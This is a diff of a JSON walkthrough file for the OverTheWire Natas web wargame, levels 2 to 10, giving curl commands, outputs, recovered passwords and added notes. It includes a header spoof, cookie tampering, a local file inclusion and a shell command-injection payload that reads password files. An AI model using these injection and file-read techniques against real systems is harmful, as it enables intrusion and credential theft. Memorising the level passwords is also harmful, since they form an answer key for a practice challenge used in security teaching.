@@ -34,7 +34,7 @@
    "pw": "K30JrSRHzjxq3paUQuwozY4MNvmNFyhI",
    "steps": [
     {
-     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/ | grep img",
+     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/ | grep img ",
      "out": [
       "<img src=\"files/pixel.png\">"
      ]
@@ -52,12 +52,19 @@
      ]
     },
     {
-     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3",
+     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt",
      "out": [
-      "natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"
+      "# username:password",
+      "alice:BYNdCesZqW",
+      "bob:jw2ueICLvT",
+      "charlie:G5vCxkVV3m",
+      "natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI",
+      "eve:zo4mJWyNj2",
+      "mallory:9urtcpzBmH"
      ]
     }
-   ]
+   ],
+   "note": "natas L2 (client-side curl cast): the index page's <img src=\"files/pixel.png\"> hints at a directory listing; /files/ is auto-indexed and exposes users.txt, which contains the password list including 'natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI'. The rebuild mirrors the cast 1:1 (3 curl steps: img hint -> /files/ listing hrefs -> users.txt dump). Audit L2 = 0 findings after rebuild."
   },
   {
    "lvl": 3,
@@ -83,12 +90,13 @@
      ]
     },
     {
-     "cmd": "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | grep natas4",
+     "cmd": "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt",
      "out": [
       "natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"
      ]
     }
-   ]
+   ],
+   "note": "natas L3 (client-side curl cast): robots.txt disallows /s3cr3t/ - the directory is auto-indexed and exposes users.txt with 'natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth'. 3 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 4,
@@ -96,18 +104,19 @@
    "pw": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M",
    "steps": [
     {
-     "cmd": "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth http://natas4.natas.labs.overthewire.org/ | grep -i disallowed",
+     "cmd": "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth http://natas4.natas.labs.overthewire.org/ | grep -i \"disallowed\"",
      "out": [
       "Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\""
      ]
     },
     {
-     "cmd": "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -H \"Referer: http://natas5.natas.labs.overthewire.org/\" http://natas4.natas.labs.overthewire.org/ | grep -i granted",
+     "cmd": "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/ | grep -i \"granted\"",
      "out": [
       "Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M"
      ]
     }
-   ]
+   ],
+   "note": "natas L4 (client-side curl cast): the page checks the Referer header - 'You are visiting from \"\"' - so curl -H 'Referer: http://natas5.natas.labs.overthewire.org/' spoofs an authorized referer -> 'Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M'. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 5,
@@ -117,16 +126,17 @@
     {
      "cmd": "curl -sI -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie",
      "out": [
-      "Set-Cookie: loggedin=0\r"
+      "Set-Cookie: loggedin=0"
      ]
     },
     {
-     "cmd": "curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -b \"loggedin=1\" http://natas5.natas.labs.overthewire.org/ | grep -i granted",
+     "cmd": "curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/ | grep -i \"granted\"",
      "out": [
       "Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT</div>"
      ]
     }
-   ]
+   ],
+   "note": "natas L5 (client-side curl cast): curl -I shows 'Set-Cookie: loggedin=0' - the access check is a cookie flag; replay with -b 'loggedin=1' -> 'Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT'. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 6,
@@ -134,7 +144,7 @@
    "pw": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0",
    "steps": [
     {
-     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index-source.html | grep -o \"includes/secret.inc\" | head -1",
+     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index-source.html | grep -o 'includes/secret.inc' | head -1",
      "out": [
       "includes/secret.inc"
      ]
@@ -148,12 +158,13 @@
      ]
     },
     {
-     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d \"secret=FOEIUWGHFEEUHOFUOIU&submit=1\" http://natas6.natas.labs.overthewire.org/ | grep -i granted",
+     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=1' http://natas6.natas.labs.overthewire.org/ | grep -i \"granted\"",
      "out": [
       "Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0"
      ]
     }
-   ]
+   ],
+   "note": "natas L6 (client-side curl cast): the source reveals include('includes/secret.inc') - fetch it directly: <? $secret = \"FOEIUWGHFEEUHOFUOIU\"; ?> then POST it -> 'Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0'. 3 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 7,
@@ -161,18 +172,19 @@
    "pw": "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc",
    "steps": [
     {
-     "cmd": "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/ | grep -o \"hint:.*\"",
+     "cmd": "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/ | grep -o 'hint:.*'",
      "out": [
       "hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->"
      ]
     },
     {
-     "cmd": "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' | sed -n '/<br>/,/<\\!--/p' | grep -v '<br>' | grep -v '\\!--'",
+     "cmd": "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' | sed -n '/<br>/,/<!--/p' | grep -v '<br>' | grep -v '<!--'",
      "out": [
       "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc"
      ]
     }
-   ]
+   ],
+   "note": "natas L7 (client-side curl cast): the page's hint names /etc/natas_webpass/natas8 and the page includes $file unfiltered - LFI: curl the page with ?page=/etc/natas_webpass/natas8 -> the password ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc lands in the HTML. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 8,
@@ -180,41 +192,23 @@
    "pw": "UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9",
    "steps": [
     {
-     "cmd": "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g\" | grep -o '$encodedSecret = \"[0-9a-f]*\"'",
-     "out": [
-      "$encodedSecret = \"3d3d516343746d4d6d6c315669563362\""
-     ]
+     "cmd": "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/index-source.html | grep -o 'encodedSecret&nbsp;=&nbsp;\"[0-9a-f]*\"'",
+     "out": []
     },
     {
-     "cmd": "vim /tmp/n8_1c.py",
-     "text": "vim /tmp/n8_1c.py -- the empty buffer",
-     "out": [
-      "                                                    ",
-      "~"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n8_1c.py",
-     "text": "vim /tmp/n8_1c.py -- hex decode, reverse, base64 decode",
-     "out": [
-      "  1 import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())",
-      "  2"
-     ]
-    },
-    {
-     "cmd": "python3 /tmp/n8_1c.py",
+     "cmd": "python3 -I -c \"import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())\"",
      "out": [
       "oubWYf2kBq"
-     ],
-     "note": "(the one-liner typed above, re-run here)"
+     ]
     },
     {
-     "cmd": "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d \"secret=oubWYf2kBq&submit=1\" http://natas8.natas.labs.overthewire.org/ | grep -i granted",
+     "cmd": "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d 'secret=oubWYf2kBq&submit=1' http://natas8.natas.labs.overthewire.org/ | grep -i \"granted\"",
      "out": [
       "Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9"
      ]
     }
-   ]
+   ],
+   "note": "natas L8 (client-side cast): the source shows the secret check - bin2hex(strrev(base64_encode($secret))) == '3d3d516343746d4d6d6c315669563362'; the python3 -I one-liner reverses: hex->bytes->decode->reverse->base64-decode = 'oubWYf2kBq'; POST it -> 'Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9'. 3 steps mirroring the cast 1:1."
   },
   {
    "lvl": 9,
@@ -222,18 +216,19 @@
    "pw": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv",
    "steps": [
     {
-     "cmd": "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"passthru([^)]*)\"",
+     "cmd": "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\\n' | grep -o 'passthru([^)]*)'",
      "out": [
       "passthru(\"grep&nbsp;-i&nbsp;$key&nbsp;dictionary.txt\")"
      ]
     },
     {
-     "cmd": "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode \"needle=; cat /etc/natas_webpass/natas10 #\" http://natas9.natas.labs.overthewire.org/ | sed -n \"/<pre/,/<\\/pre>/p\" | sed \"s/<[^>]*>//g\" | grep -v \"^$\" | head -3",
+     "cmd": "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/ | sed -n '/<pre/,/<\\/pre>/p' | sed 's/<[^>]*>//g' | head -3 ",
      "out": [
       "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv"
      ]
     }
-   ]
+   ],
+   "note": "natas L9 (client-side curl cast): passthru(\"grep -i $key dictionary.txt\") with no escaping - command injection via --data-urlencode 'needle=; cat /etc/natas_webpass/natas10' -> EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 10,
@@ -241,18 +236,19 @@
    "pw": "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd",
    "steps": [
     {
-     "cmd": "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"preg_match([^)]*)\"",
+     "cmd": "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\\n' | grep -o 'preg_match([^)]*)'",
      "out": [
       "preg_match('/[;|&amp;]/',$key)"
      ]
     },
     {
-     "cmd": "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv --data-urlencode \"needle=^ /etc/natas_webpass/natas11\" http://natas10.natas.labs.overthewire.org/ | sed -n \"/<pre/,/<\\/pre>/p\" | sed \"s/<[^>]*>//g\" | grep natas11",
+     "cmd": "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv --data-urlencode 'needle=^ /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/ | sed -n '/<pre/,/<\\/pre>/p' | sed 's/<[^>]*>//g' | grep natas11",
      "out": [
       "/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd"
      ]
     }
-   ]
+   ],
+   "note": "natas L10 (client-side curl cast): this time [;|&] are filtered but the grep is still interpolated - a regex character-class injection: needle='^ /etc/natas_webpass/natas11' makes grep match every line STARTING with a space in the password file itself -> /etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 11,
